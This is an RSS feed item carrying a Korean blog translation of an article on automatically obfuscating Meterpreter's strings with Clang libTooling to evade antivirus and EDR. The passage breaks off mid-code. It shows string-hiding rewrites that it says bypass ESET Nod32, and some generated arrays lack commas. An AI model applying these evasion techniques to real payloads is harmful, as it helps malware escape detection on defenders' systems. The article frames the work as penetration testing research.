<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Sun, 22 Nov 2020 07:58:43 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[Translation] Engineering Antivirus evasion Part.1</title>
      <link>https://hackyboiz.github.io/2020/11/22/idioth/av_evasion_part1/</link>
      <guid>https://hackyboiz.github.io/2020/11/22/idioth/av_evasion_part1/</guid>
      <pubDate>Sun, 22 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;안녕하세요. 하지 말라는 것은 더 하고 싶은 idioth입니다.&lt;/p&gt;
&lt;p&gt;원래 사람은 하지 말라면 더 하고 싶은 법. 그래서 평소 탐지 우회하는 것에 대해 관심이 많은데 관련 글이 있길래 들고 왔습니다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/202</description>
        
      
      
      
      <content:encoded><![CDATA[<p>안녕하세요. 하지 말라는 것은 더 하고 싶은 idioth입니다.</p><p>원래 사람은 하지 말라면 더 하고 싶은 법. 그래서 평소 탐지 우회하는 것에 대해 관심이 많은데 관련 글이 있길래 들고 왔습니다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/image.jpg"></p><p>평소에는 그냥 혼자 공부하고 혼자 보는거라 직독직해 해놓고 스스로 머릿 속에서 정리하였는데 글로 적으려니 고생을 좀 했습니다. 영어 실력이 좋은 것도 아니고 번역을 많이 해본 것도 아니라 의역과 오역이 난무하는 글이 될 것 같습니다…</p><p>보시다가 이 부분은 왜 이렇게 번역이 됐지? 혹은 너무 이상한데? 하시는 것 있으시면 댓글로 달아드리면 눈물 흘리며 수정하도록 하겠습니다!</p><blockquote><p>원문 글 : <a href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/">Engineering Antivirus evasion</a></p></blockquote><p><strong>tl;dr:</strong> 이 게시물은 모든 AV/EDR을 우회하기 위해 자동으로 Meterpreter을 refactoring 하는 것에 대해 설명한다. 모든 기술에 대한 아이디어와 문자열 난독화 패스의 구현이 상세히 설명되어있다. API import를 숨기는 것과 syscall 재작성에 대한 자세한 내용은 게시글이 너무 길어지므로 다음 글에서 소개할 것이다. 소스코드는 <a href="https://github.com/scrt/avcleaner">github</a>에서 확인할 수 있다.</p><p>기업이 정보 시스템을 보호하기 위해서 안티 바이러스와 EDR 같은 보안 소프트웨어는 필수적이다. 과거에는 모든 멀웨어 탐지 기술을 우회하기가 쉬웠지만 탐지 기술이 발전함에 따라 우회에 더 많은 노력이 필요하다.</p><p>취약점을 증명하기 위한 Proof-of-Concept가 안티 바이러스에 의해 차단된 경우 위험성에 대해 이야기하는 것은 매우 어렵다. 이론적으로 탐지를 우회하는 것이 가능하다고 얘기할 수 있지만 증명하기가 어렵다.</p><p> 또한 시스템의 existing foothold에서만 발견할 수 있는 취약점들이 있다. pentester가 initial level에 접근할 수 없는 경우 시스템의 실제 보안 상태를 도출할 수 없다.</p><p>따라서 안티바이러스 소프트웨어 우회는 필요하다. SCRT(필자의 팀)에서는 공개적으로 사용 가능한 오픈 소스 툴을 사용해 툴을 사용하는데 숙련된 누구나 따라 할 수 있으며 private 하고 비싼 툴에 의존하지 않아도 된다는 점을 강조한다.</p><h1 id="문제점"><a href="#문제점" class="headerlink" title="문제점"></a>문제점</h1><p>사람들은 안티 바이러스의 탐지가 정적인지 동적인지 분류하는 것을 좋아한다. 보통 실행 전에 트리거 되면 정적 탐지로 간주된다. 하지만 프로세스 생성, in-memory file downloads 같은 이벤트를 통해 멀웨어 실행 시 signature와 같은 정적 탐지 메커니즘이 호출될 수 있다는 것은 아는 것이 좋다. 모든 보안 소프트웨어에 Meterpreter를 사용하려면 다음과 같이 수정해야 한다.</p><ul><li>파일 시스템 스캔 혹은 메모리 스캔 중에 모든 static signature 우회</li><li>userland API hooking 우회와 관련된 “행동 탐지” 우회</li></ul><p>Meterpreter는 여러 모듈로 구성되며 전체 코드 베이스의 양이 많고 계속 업데이트되므로 private fork를 수행하기 힘들다. 따라서 자동으로 코드 베이스를 수정할 방법이 필요하다.</p><h1 id="해결-방안"><a href="#해결-방안" class="headerlink" title="해결 방안"></a>해결 방안</h1><p>멀웨어 탐지는 대부분 문자열, API hook, 혹은 둘의 조합을 기반으로 한다.</p><p>Cylance 같은 머신러닝 classifier를 구현하는 제품에서도 문자열, API import, 후킹 할 수 있는 API 호출이 없는 멀웨어는 탐지를 우회할 수 있다.</p><p>Meterpreter는 수천 개의 문자열을 가지고 있고 API imports는 어떠한 방법으로도 숨겨지지 않으며 <code>WriteProcessMemory</code> 같은 민감한 API는 userland API hook으로 쉽게 intercept 할 수 있다. 따라서 자동화된 방식을 사용하여 2개의 솔루션을 만들어야 한다.</p><ul><li>Source-to-source code refactoring</li><li>LLVM 컴파일 시 코드 베이스 난독화</li></ul><p>후자가 선호되는 방식이며 많은 유명한 연구들에서 같은 결론에 도달했다. transformation pass를 한 번 작성해서 소프트웨어의 프로그래밍 언어나 target architecture에 상관없이 재사용할 수 있기 때문이다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/0.png"></p><p>이미지 출처: <a href="http://www.aosabook.org/en/llvm.html">http://www.aosabook.org/en/llvm.html</a></p><p>그러나 이 방법은 Visual Studio가 아닌 다른 컴파일러로 Meterpreter를 컴파일할 수 있어야 한다. 이를 수정하기 위해 2018년 12월에 몇 가지 작업을 퍼블리시했지만 1년이 더 지난 지금도 공식 코드 베이스에 적용되지 않았다.</p><p>그동안 우리는 첫 번째 접근법을 구현하기로 결정했다. 최첨단 소스 코드 refactoring를 살펴본 결과 <em>libTooling</em>(Clang/LLVM toolchain의 일부)이 C/C++ 소스의 구문 분석과 수정에 가장 적합했다.</p><p>Note: 코드 베이스는 Visual Studio 의존성이 강하기 때문에 Clang은 Meterpreter의 많은 부분의 구문 분석에 실패할 것이다. 그러나 타겟 안티바이러스를 50% 확률로 우회할 수 있었다. 또한 소스 코드를 변환하는 것이 컴파일 시에 변환하는 것보다 장점이 있을 것이다. 후자는 에러 없이 전체 프로젝트를 컴파일해야 하지만 전자는 수천 개의 컴파일 에러에 탄력적이며 불완전한 추상 구문 트리로 끝이 난다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/1.png"></p><p>LLVM passes vs libTooling</p><h2 id="문자열-난독화"><a href="#문자열-난독화" class="headerlink" title="문자열 난독화"></a>문자열 난독화</h2><p>C/C++에서 문자열은 다양한 context 안에 존재한다.</p><p><em>libTooling</em>을 사용하는 것은 복잡하므로 Meterpreter의 코드 베이스에서 의심스러운 문자열이 나타나는 부분을 보면 다음과 같다.</p><ul><li>function arguments</li><li>list initializers</li></ul><h3 id="Fcuntion-arguments"><a href="#Fcuntion-arguments" class="headerlink" title="Fcuntion arguments"></a>Fcuntion arguments</h3><p>ESET Nod32는 다음 코드에서 <code>ntdll</code> 문자열을 의심스러운 문자열로 탐지한다.</p><pre><code class="hljs cpp">ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))</code></pre><p>그러나 다음과 같이 코드를 재작성하면 성공적으로 탐지를 우회한다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">wchar_t</span> ntdll_str[] = &#123;<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">0</span>&#125;;ntdll = LoadLibrary(ntdll_str)</code></pre><p>첫 번째 코드는 <code>.rdata</code> 섹션에 <code>&quot;ntdll&quot;</code> 문자열이 저장돼서 안티바이러스에게 쉽게 발견된다. 두 번째 코드는 문자열이 실행 시 스택에 저장돼서 보통 정적으로 구분할 수 없다. <em>IDA Pro</em>와 같은 툴에서는 문자열을 탐지할 수 있지만 바이너리를 더 복잡하게 분석해야 한다.</p><h3 id="List-initializers"><a href="#List-initializers" class="headerlink" title="List initializers"></a>List initializers</h3><p>Meterpreter의 코드 베이스에서 다음과 같은 구성은 <a href="https://github.com/rapid7/metasploit-payloads/blob/c8aa435b3c4872c58dba04acf53d157c3de2771c/c/meterpreter/source/extensions/extapi/extapi.c#L23">c/meterpreter/source/extensions/extapi/extapi.c</a>와 같은 파일에서 찾을 수 있다.</p><pre><code class="hljs cpp">Command customCommands[] =&#123;    COMMAND_REQ(<span class="hljs-string">&quot;extapi_window_enum&quot;</span>, request_window_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_enum&quot;</span>, request_service_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_query&quot;</span>, request_service_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_control&quot;</span>, request_service_control),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_get_data&quot;</span>, request_clipboard_get_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_set_data&quot;</span>, request_clipboard_set_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_start&quot;</span>, request_clipboard_monitor_start),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_pause&quot;</span>, request_clipboard_monitor_pause),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_resume&quot;</span>, request_clipboard_monitor_resume),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_purge&quot;</span>, request_clipboard_monitor_purge),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_stop&quot;</span>, request_clipboard_monitor_stop),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_dump&quot;</span>, request_clipboard_monitor_dump),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_adsi_domain_query&quot;</span>, request_adsi_domain_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_ntds_parse&quot;</span>, ntds_parse),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_wmi_query&quot;</span>, request_wmi_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_pageant_send_query&quot;</span>, request_pageant_send_query),    ...&#125;</code></pre><p>이 문자열들은 <code>ext_server_espia_x64.dll</code>의 <code>.rdata</code> 영역에 평문으로 저장되고 <em>ESET Nod32</em>에서 탐지된다.</p><p>이 문자열들은 list initialzier에 위치한 매크로의 매개변수이다. 목표는 자동으로 위의 코드를 다음과 같이 재작성하는 것이다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">char</span> hid_extapi_UQOoNXigAPq4[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_vhFHmZ8u2hfz[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_pW25eeIGBeru[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span><span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_S4Ws57MYBjib[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span><span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_HJ0lD9Dl56A4[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_IiEzXils3UsR[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_czLOBo0HcqCP[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_WcWbTrsQujiT[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_rPiFTZW4ShwA[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_05fAoaZLqOoy[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_cOOyHTPTvZGK[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_smtmvW05cI9y[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_01kuYCM8z49k[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_SMK9uFj6nThk[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> 